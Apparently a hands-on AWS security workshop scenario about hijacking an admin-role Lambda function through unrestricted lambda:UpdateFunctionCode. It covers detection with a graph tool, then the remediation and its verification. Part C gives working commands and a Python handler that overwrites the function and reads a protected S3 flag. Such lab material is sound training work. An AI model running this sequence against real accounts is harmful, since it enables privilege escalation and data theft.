## Scenario 4: Lambda UpdateFunctionCode — Existing PassRole via Function Hijacking

**Category:** Existing PassRole
**Starting Identity:** `iamws-lambda-developer-user`
**Target:** Crown jewels via hijacking `iamws-privileged-lambda` (execution role: `iamws-privileged-lambda-role` with `AdministratorAccess`)

**The Vulnerability:** `iamws-lambda-developer-user` can update the code of ANY Lambda function — including `iamws-privileged-lambda`, which runs as an admin-tier execution role. By replacing the function code with a malicious payload, the developer's code executes as `AdministratorAccess` without ever directly assuming the role.

**Real-world scenario:** A developer can deploy code to Lambda functions but shouldn't be able to access production resources. If they can modify ANY Lambda (not just their own dev functions), they can target Lambdas with privileged execution roles and read credentials, exfiltrate data, or pivot to other services.

### Part A: Identify with iam-recon

Build or refresh your iam-recon graph:

```bash
iam-recon graph create --profile taractf
```

Run the pathfinding scan — this is the correct recon surface for this scenario:

```bash
iam-recon --account $ACCOUNT_ID pathfinding
```

Look for the `[lambda-003]` and `[lambda-004]` entries:
```
[lambda-004] user/iamws-lambda-developer-user (existing-passrole)
    Path: lambda:UpdateFunctionCode + lambda:InvokeFunction
    Perms: lambda:UpdateFunctionCode, lambda:InvokeFunction
    https://www.pathfinding.cloud/paths/lambda-004

[lambda-003] user/iamws-lambda-developer-user (existing-passrole)
    Path: lambda:UpdateFunctionCode
    Perms: lambda:UpdateFunctionCode
    https://www.pathfinding.cloud/paths/lambda-003
```

Confirm the specific permission:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-lambda-developer-user \
  --action lambda:UpdateFunctionCode
```

Expected output:
```
ALLOW user/iamws-lambda-developer-user can call lambda:UpdateFunctionCode with *
```

> [!NOTE]
> `argquery --preset privesc` will **not** flag this user. iam-recon's Lambda edge checker short-circuits when the principal lacks `iam:PassRole` — since `iamws-lambda-developer-user` has `lambda:*` but no `iam:PassRole`, the existing-function path is never evaluated. Pathfinding catches it because it maps on dangerous permissions directly. This is the same edge-vs-path gap as Scenario 1.

**In the interactive visualization:** search for `lambda-developer-user`. The node is **blue** (not orange) because no edge checker flagged it. The `iamws-privileged-lambda-role` is red (Admin). There's no edge between them in the graph — but pathfinding's output shows the path exists.

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/lambda-003](https://pathfinding.cloud/paths/lambda-003):

- **Category:** Existing PassRole
- **Required permission:** `lambda:UpdateFunctionCode` (unrestricted)
- **Root cause:** Can modify ANY Lambda, not just designated ones
- **Impact:** Access to any Lambda's execution role

Unlike "New PassRole" (Scenario 3) where you create new compute with a privileged role, "Existing PassRole" exploits compute that **already has a privileged role attached** — you just swap in your code.

### Part C: Exploit the Vulnerability

**Step 1: Try the crown jewels — you're denied**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-lambda-developer-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-lambda-developer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 2: Find the privileged Lambda**

```bash
aws lambda list-functions \
  --query 'Functions[?starts_with(FunctionName, `iamws`)].{Name:FunctionName,Role:Role}' \
  --output table --profile iamws-lambda-developer-user
```

You'll see `iamws-privileged-lambda` with `iamws-privileged-lambda-role` — an admin-tier execution role.

**Step 3: Confirm the target function's role**

```bash
aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.Role' --output text \
  --profile iamws-lambda-developer-user
```

**Step 4: Save the original code hash**

```bash
ORIGINAL_HASH=$(aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.CodeSha256' --output text \
  --profile iamws-lambda-developer-user)
echo "Original hash: $ORIGINAL_HASH"
```

**Step 5: Write the malicious handler**

```bash
mkdir -p /tmp/iamws-exploit
cat > /tmp/iamws-exploit/lambda_function.py << 'PYEOF'
import boto3
def handler(event, context):
    sts = boto3.client('sts')
    s3 = boto3.client('s3')
    identity = sts.get_caller_identity()
    bucket = f"iamws-crown-jewels-{identity['Account']}"
    obj = s3.get_object(Bucket=bucket, Key='flag.txt')
    return {
        'statusCode': 200,
        'identity': {'Arn': identity['Arn']},
        'crown_jewels': obj['Body'].read().decode('utf-8')
    }
PYEOF
```

**Step 6: Package the payload**

```bash
cd /tmp/iamws-exploit && zip -j exploit.zip lambda_function.py && cd -
```

**Step 7: Overwrite the function code**

```bash
aws lambda update-function-code \
  --function-name iamws-privileged-lambda \
  --zip-file fileb:///tmp/iamws-exploit/exploit.zip \
  --profile iamws-lambda-developer-user
```

No error — the developer updated a function they shouldn't be able to touch.

**Step 8: Invoke the function**

```bash
aws lambda invoke --function-name iamws-privileged-lambda \
  --payload '{}' /tmp/iamws-exploit/response.json \
  --profile iamws-lambda-developer-user
```

**Step 9: Read the response**

```bash
cat /tmp/iamws-exploit/response.json | jq .
```

Expected output:
```json
{
  "statusCode": 200,
  "identity": {
    "Arn": "arn:aws:sts::767397689800:assumed-role/iamws-privileged-lambda-role/iamws-privileged-lambda"
  },
  "crown_jewels": "  ============================================\n     YOU FOUND THE CROWN JEWELS! ..."
}
```

The Lambda ran as `iamws-privileged-lambda-role` — the developer never directly assumed the role, but their code executed as `AdministratorAccess`.

### Part D: Apply the Defense

Run all defense steps as your admin identity.

**Step 1: Apply a scoped inline policy**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam put-user-policy \
  --user-name iamws-lambda-developer-user \
  --policy-name SecureLambdaDeveloper \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "AllowLambdaCodeUpdateDevOnly",
        "Effect": "Allow",
        "Action": ["lambda:UpdateFunctionCode","lambda:InvokeFunction"],
        "Resource": "arn:aws:lambda:*:'${ACCOUNT_ID}':function:dev-*"
      },
      {
        "Sid": "AllowLambdaReadAll",
        "Effect": "Allow",
        "Action": ["lambda:GetFunction","lambda:ListFunctions"],
        "Resource": "*"
      }
    ]
  }'
```

The fix is one statement: `Resource: "*"` → `Resource: "arn:aws:lambda:*:ACCOUNT:function:dev-*"`. The developer can still update dev functions; privileged functions like `iamws-privileged-lambda` are out of scope.

**Step 2: Detach the overly-permissive managed policy**

```bash
aws iam detach-user-policy \
  --user-name iamws-lambda-developer-user \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-lambda-developer-policy 2>/dev/null || true
```

**Step 3: Wait for AWS IAM permission changes to take effect**

AWS keeps a short-lived permission cache (~3–5 minutes) for Lambda. Without the wait, the original attack still succeeds even with zero policies attached — AWS returns the cached authorization. `simulate-principal-policy` correctly returns `implicitDeny` immediately, so use it to demo the change while waiting for the live deny to land.

```bash
sleep 60
```

### Part E: Verify the Remediation

**Step 1: Create a dummy payload**

```bash
echo "def handler(e,c): pass" > /tmp/dummy_lambda.py
cd /tmp && zip -j /tmp/dummy_lambda.zip dummy_lambda.py && cd -
```

**Step 2: Try to update the privileged Lambda**

```bash
aws lambda update-function-code \
  --function-name iamws-privileged-lambda \
  --zip-file fileb:///tmp/dummy_lambda.zip \
  --profile iamws-lambda-developer-user 2>&1 | head -3
```

Expected output:
```
An error occurred (AccessDeniedException) when calling the UpdateFunctionCode operation:
User: arn:aws:iam::767397689800:user/iamws-lambda-developer-user
is not authorized to perform: lambda:UpdateFunctionCode on resource: ...iamws-privileged-lambda
```

**Step 3: Confirm the crown jewels are still safe**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-lambda-developer-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-lambda-developer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 4: Verify with iam-recon**

Refresh the graph:

```bash
iam-recon graph create --profile taractf
```

Re-run the pathfinding scan:

```bash
iam-recon --account $ACCOUNT_ID pathfinding
```

The `[lambda-003]` and `[lambda-004]` entries for `user/iamws-lambda-developer-user` are gone.

Confirm the specific action is denied on the privileged function:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-lambda-developer-user \
  --action lambda:UpdateFunctionCode \
  --resource 'arn:aws:lambda:*:767397689800:function:iamws-privileged-lambda'
```

Expected output:
```
DENY user/iamws-lambda-developer-user cannot call lambda:UpdateFunctionCode with arn:aws:lambda:*:767397689800:function:iamws-privileged-lambda
```

> [!NOTE]
> When using `argquery --resource` with Lambda ARNs, include the account ID explicitly (`arn:aws:lambda:*:ACCOUNT_ID:function:name`). With `*` for the account component, iam-recon's wildcard matcher may return DENY even for allowed resources.

**In the interactive visualization:** search for `lambda-developer-user`. The node remains blue (no edge checker for this attack family), but the `IDENTITY` panel now shows `SecureLambdaDeveloper`. The `iamws-privileged-lambda-role` node is still red, and there is still no edge between user and role — the graph never showed this attack.

### What You Learned

- `lambda:UpdateFunctionCode` with `Resource: "*"` allows hijacking any Lambda function. The attack path never requires `iam:PassRole` — you update existing compute that already has a privileged role attached.
- **Resource constraints** (`dev-*` ARN pattern) are the fix. The naming convention between dev and privileged functions becomes the security boundary.
- AWS IAM has a short-lived permission cache (~3–5 minutes) for Lambda — wait before verifying live, or use `simulate-principal-policy` for immediate offline confirmation.
- iam-recon's `argquery --preset privesc` does not catch this attack family. Pathfinding is the correct discovery and verification surface.

### Cleanup

See [`cleanup.md`](cleanup.md) for revert steps before moving to the next scenario.

---

**Next:** [Scenario 5: Lambda Secrets](../scenario-5-lambda-secrets/instructions.md) — Credential access via Lambda environment variables
